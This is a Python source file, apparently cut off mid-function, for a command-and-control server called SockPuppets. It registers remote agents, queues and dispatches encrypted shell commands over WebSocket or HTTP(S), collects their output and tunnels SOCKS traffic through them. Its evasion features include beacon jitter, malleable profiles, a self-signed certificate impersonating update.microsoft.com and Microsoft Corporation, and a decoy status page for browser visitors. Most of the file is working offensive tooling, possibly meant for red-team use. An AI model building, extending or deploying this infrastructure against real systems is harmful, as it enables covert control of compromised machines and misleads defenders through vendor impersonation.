#!/usr/bin/env python3
"""
SockPuppets Server
Handles agent connections, command dispatch, and session management
Supports WebSocket, HTTP, and HTTPS transports
"""

import asyncio
import threading
import websockets
import json
import uuid
import base64
import socket
import struct
import zlib
import ssl
import os
from pathlib import Path
from datetime import datetime
from typing import Dict, Set, Optional
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

# Optional: malleable C2 profile support
try:
    from evasion.profiles import ProfileParser, ProfileTransformer
    _HAS_PROFILES = True
except ImportError:
    _HAS_PROFILES = False

try:
    from aiohttp import web
    import aiohttp.tcp_helpers
    import aiohttp.web_protocol
    _orig_keepalive = aiohttp.tcp_helpers.tcp_keepalive
    def _safe_keepalive(transport):
        try:
            _orig_keepalive(transport)
        except OSError:
            pass
    aiohttp.tcp_helpers.tcp_keepalive = _safe_keepalive
    aiohttp.web_protocol.tcp_keepalive = _safe_keepalive
except ImportError:
    web = None

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Suppress noisy websockets logs
logging.getLogger('websockets').setLevel(logging.WARNING)


class EventBus:
    """Thread-safe pub/sub for real-time GUI/TUI events.
    Subscribers may live in different asyncio event loops (e.g. Uvicorn thread),
    so we pair each asyncio.Queue with the loop that created it and use
    call_soon_threadsafe to deliver cross-thread."""

    def __init__(self):
        self._subscribers: list[tuple[asyncio.Queue, asyncio.AbstractEventLoop]] = []
        self._lock = threading.Lock()

    def subscribe(self) -> asyncio.Queue:
        q = asyncio.Queue()
        loop = asyncio.get_event_loop()
        with self._lock:
            self._subscribers.append((q, loop))
        return q

    def unsubscribe(self, q: asyncio.Queue):
        with self._lock:
            self._subscribers = [(sq, sl) for sq, sl in self._subscribers if sq is not q]

    def emit(self, event: dict):
        event.setdefault("timestamp", datetime.now().isoformat())
        with self._lock:
            subs = list(self._subscribers)
        for q, loop in subs:
            try:
                loop.call_soon_threadsafe(q.put_nowait, event)
            except RuntimeError:
                pass


class Agent:
    """Represents a connected agent"""
    def __init__(self, agent_id: str, metadata: dict, transport_type: str = 'websocket'):
        self.agent_id = agent_id
        self.metadata = metadata
        self.transport_type = transport_type  # 'websocket', 'http', 'https'
        self.websocket = None  # WebSocket connection (if WS transport)
        self.encryption_key = None  # Per-agent encryption key (bytes)
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.command_queue = asyncio.Queue()
        self.response_queue = asyncio.Queue()
        self.socks_proxy = None
        self.socks_data_queues = {}  # conn_id -> asyncio.Queue
        self.mode = metadata.get('mode', 'streaming')  # 'beacon' or 'streaming'
        self.beacon_interval = metadata.get('beacon_interval', 60)
        self.beacon_jitter = metadata.get('beacon_jitter', 0)
        self.pending_results = []  # Store results from beacon checkins
        self.command_history = []  # Track commands sent
        self.pending_kill = False
        self.socks_task = None
        self.socks_server_obj = None
        self.command_sender_task = None  # Track send_commands task
        self.c2s_key = None  # Per-agent AES key for client-to-server
        self.s2c_key = None  # Per-agent AES key for server-to-client
        self.http_pending_commands = []  # Commands waiting for HTTP poll pickup
        self.pending_commands = {}  # command_id -> asyncio.Future (for streaming correlation)
        self._cmd_lock = threading.Lock()  # Thread-safe access for HTA handler

    def get_info(self) -> dict:
        info = {
            'id': self.agent_id,
            'hostname': self.metadata.get('hostname', 'Unknown'),
            'username': self.metadata.get('username', 'Unknown'),
            'os': self.metadata.get('os', 'Unknown'),
            'ip': self.metadata.get('ip', 'Unknown'),
            'connected_at': self.connected_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'mode': self.mode,
            'transport': self.transport_type,
            'beacon_interval': self.beacon_interval,
            'beacon_jitter': self.beacon_jitter,
        }
        return info

    def is_http(self) -> bool:
        return self.transport_type in ('http', 'https')


class SockPuppetsServer:
    """Main server class"""
    def __init__(self, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
        self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key
        # Per-agent key support: set of all known valid encryption keys
        self.known_keys: set = {self.encryption_key}
        # Derive bootstrap keys for pre-registration messages (directional)
        self.bootstrap_key = HKDF(
            algorithm=hashes.SHA256(), length=32,
            salt=b"sockpuppets-bootstrap", info=b"sockpuppets-c2s"
        ).derive(self.encryption_key)
        self.bootstrap_s2c_key = HKDF(
            algorithm=hashes.SHA256(), length=32,
            salt=b"sockpuppets-bootstrap", info=b"sockpuppets-s2c"
        ).derive(self.encryption_key)
        self.agents: Dict[str, Agent] = {}
        self.active_connections: Set[websockets.WebSocketServerProtocol] = set()
        self.listeners: Dict[str, dict] = {}  # Track active listeners {name: {type, host, port, task, ...}}
        self.streaming_module = self._load_streaming_module()
        self.ws_server = None
        self._keys_file = Path(__file__).parent / '.agent_keys.json'
        self._load_saved_keys()
        # Malleable C2 profile support
        self.profile_name = 'default'
        self.profile = None
        self.events = EventBus()
        self.trusted_redirectors: list[str] = []

    def _load_streaming_module(self) -> str:
        """Load and compress streaming module"""
        try:
            module_path = Path(__file__).parent / 'templates' / 'streaming_module.py'
            with open(module_path, 'r') as f:
                module_code = f.read()

            # Compress the module
            compressed = zlib.compress(module_code.encode(), level=9)
            encoded = base64.b64encode(compressed).decode()

            logger.info(f"Loaded streaming module ({len(module_code)} bytes -> {len(compressed)} bytes compressed)")
            return encoded
        except Exception as e:
            logger.error(f"Failed to load streaming module: {e}")
            return ""

    def simple_encrypt(self, data: str, key: bytes = None) -> str:
        """AES-256-GCM encryption: base64(AES1 + nonce12 + ciphertext + tag16)"""
        key = key or self.encryption_key
        aes_key = self._derive_aes_key(key)
        nonce = os.urandom(12)
        aesgcm = AESGCM(aes_key)
        ct = aesgcm.encrypt(nonce, data.encode('utf-8'), None)
        return base64.b64encode(b'AES1' + nonce + ct).decode()

    def simple_decrypt(self, data: str, key: bytes = None) -> str:
        """AES-256-GCM decryption: expects base64(AES1 + nonce12 + ciphertext + tag16)"""
        key = key or self.encryption_key
        raw = base64.b64decode(data.encode())
        if len(raw) < 32 or raw[:4] != b'AES1':
            raise ValueError("Invalid AES-GCM payload (missing AES1 prefix)")
        nonce = raw[4:16]
        ct = raw[16:]
        aes_key = self._derive_aes_key(key)
        aesgcm = AESGCM(aes_key)
        pt = aesgcm.decrypt(nonce, ct, None)
        return pt.decode('utf-8')

    @staticmethod
    def _derive_aes_key(key: bytes) -> bytes:
        """Derive a 32-byte AES key from the agent key using SHA-256"""
        import hashlib
        return hashlib.sha256(key).digest()

    def derive_agent_keys(self, agent_id: str) -> tuple:
        """Derive per-agent directional AES-256 keys using HKDF-SHA256"""
        salt = agent_id.encode()
        c2s_key = HKDF(
            algorithm=hashes.SHA256(), length=32,
            salt=salt, info=b"sockpuppets-c2s"
        ).derive(self.encryption_key)
        s2c_key = HKDF(
            algorithm=hashes.SHA256(), length=32,
            salt=salt, info=b"sockpuppets-s2c"
        ).derive(self.encryption_key)
        return (c2s_key, s2c_key)

    def try_decrypt(self, data: str) -> tuple:
        """Try all known keys to decrypt data via AES-256-GCM.
        Returns (decrypted_str, key_used). Raises ValueError if no key works."""
        for key in self.known_keys:
            try:
                result = self.simple_decrypt(data, key)
                json.loads(result)
                return result, key
            except Exception:
                continue
        raise ValueError("No known key could decrypt the message")

    def encrypt_for_agent(self, agent_id: str, data: str) -> str:
        """Encrypt data using the agent's specific key"""
        if agent_id in self.agents and self.agents[agent_id].encryption_key:
            return self.simple_encrypt(data, self.agents[agent_id].encryption_key)
        return self.simple_encrypt(data)

    def add_encryption_key(self, key) -> None:
        """Register a new agent encryption key"""
        if isinstance(key, str):
            key = key.encode()
        self.known_keys.add(key)
        self._save_keys()
        logger.info(f"Added encryption key ({len(self.known_keys)} total keys)")

    def _save_keys(self):
        """Persist known keys to disk"""
        try:
            keys_list = [k.decode() if isinstance(k, bytes) else k for k in self.known_keys]
            with open(self._keys_file, 'w') as f:
                json.dump(keys_list, f)
        except Exception as e:
            logger.debug(f"Could not save keys: {e}")

    def _load_saved_keys(self):
        """Load previously saved keys from disk"""
        try:
            if self._keys_file.exists():
                with open(self._keys_file, 'r') as f:
                    keys_list = json.load(f)
                for k in keys_list:
                    self.known_keys.add(k.encode() if isinstance(k, str) else k)
                if len(keys_list) > 1:
                    logger.info(f"Loaded {len(keys_list)} saved encryption keys")
        except Exception as e:
            logger.debug(f"Could not load saved keys: {e}")

    # ──────────────────────────────────────────────
    # TLS Certificate Management
    # ──────────────────────────────────────────────

    def _generate_self_signed_cert(self, cert_path: str, key_path: str):
        """Generate a self-signed TLS certificate"""
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime as dt

            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Microsoft Corporation"),
                x509.NameAttribute(NameOID.COMMON_NAME, "update.microsoft.com"),
            ])

            cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(dt.datetime.now(dt.timezone.utc))
                .not_valid_after(dt.datetime.now(dt.timezone.utc) + dt.timedelta(days=365))
                .sign(key, hashes.SHA256())
            )

            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))

            with open(key_path, "wb") as f:
                f.write(key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption()
                ))

            logger.info(f"Generated self-signed certificate: {cert_path}")
            return True

        except ImportError:
            # Fallback: use openssl command
            try:
                import subprocess
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                    '-keyout', key_path, '-out', cert_path,
                    '-days', '365', '-nodes',
                    '-subj', '/CN=update.microsoft.com/O=Microsoft Corporation/C=US'
                ], capture_output=True, check=True)
                logger.info(f"Generated self-signed certificate via openssl: {cert_path}")
                return True
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.error("Cannot generate TLS cert: install 'cryptography' package or ensure 'openssl' is in PATH")
                return False

    def _get_ssl_context(self, cert_path: Optional[str] = None, key_path: Optional[str] = None) -> Optional[ssl.SSLContext]:
        """Get or create SSL context for HTTPS listener"""
        certs_dir = Path(__file__).parent / 'certs'
        certs_dir.mkdir(exist_ok=True)

        if cert_path and key_path:
            # User-provided certs
            if not Path(cert_path).exists() or not Path(key_path).exists():
                logger.error(f"Certificate files not found: {cert_path}, {key_path}")
                return None
        else:
            # Auto-generate self-signed
            cert_path = str(certs_dir / 'server.pem')
            key_path = str(certs_dir / 'server.key')

            if not Path(cert_path).exists() or not Path(key_path).exists():
                logger.info("Generating self-signed TLS certificate...")
                if not self._generate_self_signed_cert(cert_path, key_path):
                    return None

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_path, key_path)
        return ctx

    # ──────────────────────────────────────────────
    # Agent Registration (transport-agnostic)
    # ──────────────────────────────────────────────

    def register_agent_common(self, agent_id: str, metadata: dict, transport_type: str) -> Agent:
        """Register a new agent (shared by WS and HTTP handlers)"""
        agent = Agent(agent_id, metadata, transport_type)
        self.agents[agent_id] = agent
        logger.info(f"New agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')}) via {transport_type.upper()}")
        return agent

    async def register_agent(self, websocket, message: dict) -> str:
        """Register a new agent connection (WebSocket)"""
        agent_id = str(uuid.uuid4())[:8]
        metadata = message.get('metadata', {})
        remote_ip = websocket.remote_address[0]
        forwarded_for = None
        if hasattr(websocket, 'request_headers'):
            forwarded_for = websocket.request_headers.get('X-Forwarded-For')
        if forwarded_for and remote_ip in self.trusted_redirectors:
            metadata['ip'] = forwarded_for.split(',')[0].strip()
        else:
            metadata['ip'] = remote_ip

        agent = self.register_agent_common(agent_id, metadata, 'websocket')
        agent.websocket = websocket
        self.active_connections.add(websocket)

        # Derive per-agent directional encryption keys
        agent.c2s_key, agent.s2c_key = self.derive_agent_keys(agent_id)

        self.events.emit({
            "event": "agent_registered",
            "agent": agent.get_info(),
        })
        return agent_id

    # ──────────────────────────────────────────────
    # WebSocket Handler (existing, unchanged logic)
    # ──────────────────────────────────────────────

    async def handle_agent(self, websocket, path=None):
        """Handle individual agent connection (WebSocket)"""
        agent_id = None
        ws_key = None  # Track which key this WS connection uses
        try:
            async for message in websocket:
                try:
                    # Decrypt and parse message (try per-agent key first, then all keys)
                    if ws_key:
                        try:
                            decrypted = self.simple_decrypt(message, ws_key)
                            data = json.loads(decrypted)
                        except (json.JSONDecodeError, Exception):
                            decrypted, ws_key = self.try_decrypt(message)
                            data = json.loads(decrypted)
                    else:
                        decrypted, ws_key = self.try_decrypt(message)
                        data = json.loads(decrypted)

                    msg_type = data.get('type')

                    if msg_type == 'register':
                        agent_id = await self.register_agent(websocket, data)
                        agent = self.agents[agent_id]
                        agent.encryption_key = ws_key
                        response = {
                            'type': 'registered',
                            'agent_id': agent_id,
                            'status': 'success'
                        }
                        encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
                        await websocket.send(encrypted_response)

                        # Start command handler for this agent
                        agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                    elif msg_type == 'checkin':
                        # Beacon checking in with existing agent_id
                        agent_id = data.get('agent_id')
                        if agent_id and agent_id in self.agents:
                            # Update existing agent's connection
                            agent = self.agents[agent_id]
                            agent.websocket = websocket
                            agent.transport_type = 'websocket'
                            agent.encryption_key = ws_key
                            agent.last_seen = datetime.now()
                            self.active_connections.add(websocket)

                            # Update metadata if provided
                            metadata = data.get('metadata', {})
                            if metadata:
                                agent.mode = metadata.get('mode', agent.mode)
                                agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                                agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)

                            # Restart command sender task if it died
                            if agent.command_sender_task is None or agent.command_sender_task.done():
                                logger.debug(f"Restarting command sender task for {agent_id}")
                                agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                            pending_commands = []
                            while not agent.command_queue.empty():
                                try:
                                    cmd = agent.command_queue.get_nowait()
                                    if isinstance(cmd, dict):
                                        pending_commands.append(cmd)
                                    else:
                                        pending_commands.append({
                                            'type': 'command', 'command': cmd,
                                            'timestamp': datetime.now().isoformat()
                                        })
                                except asyncio.QueueEmpty:
                                    break

                            response = {
                                'type': 'checkin_ack',
                                'agent_id': agent_id,
                                'status': 'success',
                                'commands': pending_commands,
                            }
                        else:
                            # Agent ID not found, treat as new registration
                            agent_id = await self.register_agent(websocket, data)
                            response = {
                                'type': 'registered',
                                'agent_id': agent_id,
                                'status': 'success'
                            }
                            agent = self.agents[agent_id]
                            agent.encryption_key = ws_key
                            agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                        encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
                        await websocket.send(encrypted_response)

                    elif msg_type == 'heartbeat':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            agent.last_seen = datetime.now()
                            if agent.command_sender_task is None or agent.command_sender_task.done():
                                agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))
                            response = {'type': 'heartbeat_ack', 'status': 'alive'}
                            encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
                            await websocket.send(encrypted_response)

                    elif msg_type == 'response':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            output = data.get('output', '')
                            command = data.get('command', '')
                            timestamp = data.get('timestamp', '')

                            # Store result differently based on mode
                            if agent.mode == 'beacon':
                                # Beacon mode: store for later retrieval
                                agent.pending_results.append({
                                    'command': command,
                                    'output': output,
                                    'timestamp': timestamp,
                                    'received_at': datetime.now().isoformat()
                                })
                            else:
                                # Streaming mode: resolve command future by command_id
                                command_id = data.get('command_id', '')
                                if command_id and command_id in agent.pending_commands:
                                    try:
                                        agent.pending_commands.pop(command_id).set_result(output)
                                    except asyncio.InvalidStateError:
                                        pass
                                else:
                                    try:
                                        agent.response_queue.put_nowait(output)
                                    except asyncio.QueueFull:
                                        pass

                            agent.last_seen = datetime.now()
                            self.events.emit({
                                "event": "agent_result",
                                "agent_id": agent_id,
                                "command": command,
                                "output": output[:500],
                            })
                            logger.debug(f"Result received from {agent_id}: {command[:50]}...")

                    elif msg_type == 'socks_data':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            conn_id = data.get('conn_id', '')
                            socks_payload = data.get('data', b'')
                            if conn_id and conn_id in agent.socks_data_queues:
                                await agent.socks_data_queues[conn_id].put(socks_payload)
                            agent.last_seen = datetime.now()

                    elif msg_type == 'socks_close':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            conn_id = data.get('conn_id', '')
                            if conn_id and conn_id in agent.socks_data_queues:
                                await agent.socks_data_queues[conn_id].put(None)

                    elif msg_type == 'socks_connect_ack':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            conn_id = data.get('conn_id', '')
                            if conn_id and conn_id in agent.socks_data_queues:
                                success = data.get('success', False)
                                await agent.socks_data_queues[conn_id].put(
                                    {'type': 'connect_ack', 'success': success, 'error': data.get('error', '')}
                                )

                    elif msg_type == 'mode_change':
                        if agent_id and agent_id in self.agents:
                            new_mode = data.get('mode', 'streaming')
                            self.agents[agent_id].mode = new_mode
                            self.agents[agent_id].last_seen = datetime.now()
                            logger.info(f"Agent {agent_id} switched to {new_mode} mode")

                    elif msg_type == 'upgrade_failed':
                        if agent_id and agent_id in self.agents:
                            self.agents[agent_id].mode = 'beacon'
                            logger.warning(f"Agent {agent_id} failed to upgrade to WebSocket, continuing HTTP (mode reset to beacon)")

                except json.JSONDecodeError:
                    logger.error("Failed to decode message")
                except Exception as e:
                    logger.error(f"Error processing message: {e}")

        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            if agent_id and agent_id in self.agents:
                agent = self.agents[agent_id]
                self.active_connections.discard(websocket)
                for q in agent.socks_data_queues.values():
                    try:
                        q.put_nowait(None)
                    except asyncio.QueueFull:
                        pass
                if agent.socks_server_obj:
                    agent.socks_server_obj.close()
                    agent.socks_server_obj = None
                    agent.socks_proxy = None
                if agent.command_sender_task and not agent.command_sender_task.done():
                    agent.command_sender_task.cancel()
                    agent.command_sender_task = None
                self.events.emit({
                    "event": "agent_disconnected",
                    "agent_id": agent_id,
                })

    async def send_commands(self, agent_id: str):
        """Send queued commands to agent (WebSocket transport)"""
        if agent_id not in self.agents:
            return

        agent = self.agents[agent_id]

        # HTTP agents don't use this task — commands are delivered via poll response
        if agent.is_http():
            return

        while True:
            try:
                command = await agent.command_queue.get()

                if isinstance(command, dict):
                    message = command
                    message.setdefault('timestamp', datetime.now().isoformat())
                else:
                    message = {
                        'type': 'command',
                        'command': command,
                        'timestamp': datetime.now().isoformat()
                    }

                encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)

                max_retries = 30 if agent.mode == 'beacon' else 1
                sent = False
                for attempt in range(max_retries):
                    try:
                        if agent.websocket in self.active_connections:
                            await agent.websocket.send(encrypted)
                            cmd_desc = command if isinstance(command, str) else command.get('type', 'structured')
                            logger.info(f"Command sent to {agent_id}: {cmd_desc}")
                            sent = True
                            break
                        else:
                            if attempt < max_retries - 1:
                                await asyncio.sleep(1)
                    except websockets.exceptions.ConnectionClosed:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)

                if not sent:
                    logger.warning(f"Command delivery failed for {agent_id}, re-queuing")
                    try:
                        agent.command_queue.put_nowait(command)
                    except asyncio.QueueFull:
                        logger.error(f"Command permanently lost for {agent_id}: queue full")
                    await asyncio.sleep(5)

            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.error(f"Error in send_commands for {agent_id}: {e}")
                continue

    # ──────────────────────────────────────────────
    # HTTP/HTTPS Handler (aiohttp)
    # ──────────────────────────────────────────────

    def _create_http_app(self) -> 'web.Application':
        """Create aiohttp application with flexible routing for malleable C2 profiles.
        Accepts any POST/GET path — routes by decrypting payload and inspecting msg type."""
        if web is None:
            raise ImportError("aiohttp is required for HTTP/HTTPS listeners. Install with: pip install aiohttp")

        app = web.Application()
        # Catch-all POST handler — malleable profiles use varying URIs
        app.router.add_post('/{path:.*}', self._http_handle_any_post)
        # Catch-all GET handler for heartbeat and index
        app.router.add_get('/{path:.*}', self._http_handle_any_get)
        return app

    async def _http_handle_any_post(self, request: 'web.Request') -> 'web.Response':
        """Route POST requests by decrypting payload and inspecting message type.
        Supports malleable C2 profiles that use varying URI paths."""
        try:
            body = await request.text()
            if not body.strip():
                return await self._http_handle_index(request)

            decrypted, key_used = self.try_decrypt(body)
            data = json.loads(decrypted)
            msg_type = data.get('type', '')

            if msg_type == 'register':
                return await self._http_do_register(request, data, key_used)
            elif msg_type == 'checkin':
                return await self._http_do_checkin(request, data, key_used)
            elif msg_type == 'response':
                return await self._http_do_results(request, data, key_used)
            else:
                return web.Response(status=400)

        except ValueError:
            # Decryption failed — not a C2 message, serve fake page
            return await self._http_handle_index(request)
        except Exception as e:
            logger.error(f"HTTP handler error: {e}")
            return web.Response(status=500)

    async def _http_handle_any_get(self, request: 'web.Request') -> 'web.Response':
        """Route GET requests — heartbeat or fake index"""
        agent_id = request.query.get('sid', '')
        if agent_id and agent_id in self.agents:
            return await self._http_handle_heartbeat(request)
        return await self._http_handle_index(request)

    async def _http_do_register(self, request, data, key_used):
        """Process agent registration from parsed data"""
        agent_id = str(uuid.uuid4())[:8]
        metadata = data.get('metadata', {})
        peername = request.remote
        metadata['ip'] = peername or 'Unknown'
        transport_type = 'https' if request.secure else 'http'
        agent = self.register_agent_common(agent_id, metadata, transport_type)
        agent.encryption_key = key_used
        agent.c2s_key, agent.s2c_key = self.derive_agent_keys(agent_id)

        self.events.emit({
            "event": "agent_registered",
            "agent": agent.get_info(),
        })

        response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
        encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
        return web.Response(text=encrypted_response, content_type='text/html')

    async def _http_do_checkin(self, request, data, key_used):
        """Process agent checkin from parsed data"""
        agent_id = data.get('agent_id')
        if not agent_id:
            return web.Response(status=400)

        if agent_id in self.agents:
            agent = self.agents[agent_id]
            agent.last_seen = datetime.now()
            transport_type = 'https' if request.secure else 'http'
            agent.transport_type = transport_type
            metadata = data.get('metadata', {})
            if metadata:
                agent.mode = metadata.get('mode', agent.mode)
                agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)

            results = data.get('results') or []
            for result in results:
                output = result.get('output', '')
                command = result.get('command', '')
                timestamp = result.get('timestamp', '')
                if agent.mode == 'beacon':
                    agent.pending_results.append({
                        'command': command, 'output': output,
                        'timestamp': timestamp, 'received_at': datetime.now().isoformat()
                    })
                else:
                    try:
                        agent.response_queue.put_nowait(output)
                    except asyncio.QueueFull:
                        pass
                if command:
                    self.events.emit({
                        "event": "agent_result",
                        "agent_id": agent_id,
                        "command": command,
                        "output": output[:500],
                    })

            commands = []
            if agent.mode == 'beacon':
                while not agent.command_queue.empty():
                    try:
                        cmd = agent.command_queue.get_nowait()
                        if isinstance(cmd, dict):
                            commands.append(cmd)
                        else:
                            commands.append({
                                'type': 'command', 'command': cmd,
                                'timestamp': datetime.now().isoformat()
                            })
                    except asyncio.QueueEmpty:
                        break
            else:
                try:
                    cmd = await asyncio.wait_for(agent.command_queue.get(), timeout=30.0)
                    if isinstance(cmd, dict):
                        commands.append(cmd)
                    else:
                        commands.append({
                            'type': 'command', 'command': cmd,
                            'timestamp': datetime.now().isoformat()
                        })
                except asyncio.TimeoutError:
                    pass

            response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)

            if agent.pending_kill and any(c.get('command') == '__kill' for c in commands):
                del self.agents[agent_id]
                self.events.emit({"event": "agent_killed", "agent_id": agent_id})

            return web.Response(text=encrypted_response, content_type='text/html')
        else:
            logger.warning(f"Checkin from unknown agent_id={agent_id}, rejecting")
            return web.Response(status=404)

    async def _http_do_results(self, request, data, key_used):
        """Process command results from parsed data"""
        agent_id = data.get('agent_id')
        if not agent_id or agent_id not in self.agents:
            return web.Response(status=404)
        agent = self.agents[agent_id]
        agent.last_seen = datetime.now()
        output = data.get('output', '')
        command = data.get('command', '')
        command_id = data.get('command_id', '')
        timestamp = data.get('timestamp', '')
        if command_id and command_id in agent.pending_commands:
            future = agent.pending_commands.pop(command_id)
            if not future.done():
                future.set_result(output)
        elif agent.mode == 'beacon':
            agent.pending_results.append({
                'command': command, 'output': output,
                'timestamp': timestamp, 'received_at': datetime.now().isoformat()
            })
        else:
            try:
                agent.response_queue.put_nowait(output)
            except asyncio.QueueFull:
                pass
        if command:
            self.events.emit({
                "event": "agent_result",
                "agent_id": agent_id,
                "command": command,
                "output": output[:500],
            })
        response = {'type': 'result_ack', 'status': 'success'}
        encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
        return web.Response(text=encrypted_response, content_type='text/html')

    async def _http_handle_index(self, request: 'web.Request') -> 'web.Response':
        """Serve a fake page for browser visitors"""
        html = """<!DOCTYPE html>
<html><head><title>Service Status</title></head>
<body><h1>Service is running</h1><p>All systems operational.</p></body></html>"""
        return web.Response(text=html, content_type='text/html')

    async def _http_handle_register(self, request: 'web.Request') -> 'web.Response':
        """Handle agent registration via HTTP POST"""
        try:
            body = await request.text()
            decrypted, key_used = self.try_decrypt(body)
            data = json.loads(decrypted)

            msg_type = data.get('type')
            if msg_type != 'register':
                return web.Response(status=400)

            agent_id = str(uuid.uuid4())[:8]
            metadata = data.get('metadata', {})

            # Get client IP
            peername = request.remote
            metadata['ip'] = peername or 'Unknown'

            # Determine transport type from request scheme
            transport_type = 'https' if request.secure else 'http'

            agent = self.register_agent_common(agent_id, metadata, transport_type)
            agent.encryption_key = key_used  # Store per-agent key

            response = {
                'type': 'registered',
                'agent_id': agent_id,
                'status': 'success'
            }
            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
            return web.Response(text=encrypted_response, content_type='text/html')

        except Exception as e:
            logger.error(f"HTTP register error: {e}")
            return web.Response(status=500)

    async def _http_handle_checkin(self, request: 'web.Request') -> 'web.Response':
        """Handle agent checkin/poll via HTTP POST (beacon or long-poll)"""
        try:
            body = await request.text()
            decrypted, key_used = self.try_decrypt(body)
            data = json.loads(decrypted)

            msg_type = data.get('type')
            agent_id = data.get('agent_id')

            if msg_type == 'checkin' and agent_id:
                if agent_id in self.agents:
                    agent = self.agents[agent_id]
                    agent.last_seen = datetime.now()

                    # Update transport type if changed
                    transport_type = 'https' if request.secure else 'http'
                    agent.transport_type = transport_type

                    # Update metadata if provided
                    metadata = data.get('metadata', {})
                    if metadata:
                        agent.mode = metadata.get('mode', agent.mode)
                        agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                        agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)

                    # Process any results sent with the checkin
                    results = data.get('results', [])
                    for result in results:
                        output = result.get('output', '')
                        command = result.get('command', '')
                        timestamp = result.get('timestamp', '')

                        if agent.mode == 'beacon':
                            agent.pending_results.append({
                                'command': command,
                                'output': output,
                                'timestamp': timestamp,
                                'received_at': datetime.now().isoformat()
                            })
                        else:
                            try:
                                agent.response_queue.put_nowait(output)
                            except asyncio.QueueFull:
                                pass

                    # Collect commands to send back
                    commands = []

                    if agent.mode == 'beacon':
                        # Beacon mode: drain all queued commands immediately
                        while not agent.command_queue.empty():
                            try:
                                cmd = agent.command_queue.get_nowait()
                                commands.append({
                                    'type': 'command',
                                    'command': cmd,
                                    'timestamp': datetime.now().isoformat()
                                })
                                logger.debug(f"HTTP command sent to {agent_id}: {cmd}")
                            except asyncio.QueueEmpty:
                                break
                    else:
                        # Long-poll mode: wait up to 30s for a command
                        try:
                            cmd = await asyncio.wait_for(agent.command_queue.get(), timeout=30.0)
                            commands.append({
                                'type': 'command',
                                'command': cmd,
                                'timestamp': datetime.now().isoformat()
                            })
                            logger.debug(f"HTTP long-poll command sent to {agent_id}: {cmd}")
                        except asyncio.TimeoutError:
                            pass  # No commands, return empty

                    if commands:
                        response = {
                            'type': 'commands',
                            'commands': commands
                        }
                    else:
                        response = {
                            'type': 'no_commands'
                        }

                    encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
                    return web.Response(text=encrypted_response, content_type='text/html')

                else:
                    # Unknown agent_id — re-register
                    new_id = str(uuid.uuid4())[:8]
                    metadata = data.get('metadata', {})
                    peername = request.remote
                    metadata['ip'] = peername or 'Unknown'
                    transport_type = 'https' if request.secure else 'http'
                    agent = self.register_agent_common(new_id, metadata, transport_type)
                    agent.encryption_key = key_used

                    response = {
                        'type': 'registered',
                        'agent_id': new_id,
                        'status': 'success'
                    }
                    encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
                    return web.Response(text=encrypted_response, content_type='text/html')

            return web.Response(status=400)

        except Exception as e:
            logger.error(f"HTTP checkin error: {e}")
            return web.Response(status=500)

    async def _http_handle_results(self, request: 'web.Request') -> 'web.Response':
        """Handle command results via HTTP POST"""
        try:
            body = await request.text()
            decrypted, key_used = self.try_decrypt(body)
            data = json.loads(decrypted)

            agent_id = data.get('agent_id')
            if not agent_id or agent_id not in self.agents:
                return web.Response(status=404)

            agent = self.agents[agent_id]
            agent.last_seen = datetime.now()

            output = data.get('output', '')
            command = data.get('command', '')
            timestamp = data.get('timestamp', '')

            if agent.mode == 'beacon':
